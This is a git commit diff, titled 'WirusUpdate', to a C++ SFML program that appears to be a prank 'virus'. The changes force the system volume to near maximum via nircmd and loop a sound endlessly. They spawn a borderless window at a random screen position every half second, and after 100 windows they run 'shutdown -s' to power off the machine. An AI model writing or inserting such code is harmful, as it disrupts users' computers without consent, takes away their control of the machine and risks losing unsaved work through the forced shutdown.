4d7a45f7090c2504b01f2679cca5451ebf3c2455
Jakub <113696735+DziadekSwinka@users.noreply.github.com>
2022-11-04 22:12:35 +0100

    WirusUpdate

--- main.cpp
+++ main.cpp
@@ -2,6 +2,7 @@
 #include<SFML/Audio.hpp>
 #include<vector>
 #include<windows.h>
+#include<cstdlib>
 
 int main()
 {
@@ -15,17 +16,19 @@ int main()
     buffer.loadFromFile("intro.wav");
     sf::Sound sound;
     sound.setBuffer(buffer);
+    system("start nircmd//nircmdc.exe setsysvolume 65534");
+    sound.setLoop(true);
     sound.play();
     for(int i=0;i<7;i++)
     {
-        std::string file="Textures//s"+std::to_string(i+1)+".jpg";
+        std::string file="Textures//s"+std::to_string(7-i)+".jpg";
         texture[i].loadFromFile(file);
         sprite[i].setTexture(texture[i]);
     }
-    while (sound.getStatus()==sf::SoundSource::Status::Playing)
+    while (true)
     {
         time=clock.getElapsedTime();
-        if(time.asSeconds()>3)
+        if(time.asSeconds()>0.5)
         {
             Windows.push_back(new sf::RenderWindow(sf::VideoMode(texture[Windows.size()%7].getSize().x,texture[Windows.size()%7].getSize().y),"",sf::Style::None));
             Windows[Windows.size()-1]->setPosition(sf::Vector2i(std::rand()%1300,std::rand()%800));
@@ -36,6 +39,11 @@ int main()
             Windows[i]->clear();
             Windows[i]->draw(sprite[i%7]);
             Windows[i]->display();
+        }
+        if(Windows.size()>=100)
+        {
+            system("shutdown -s");
+            exit(0);
         }
     }
     return 0;
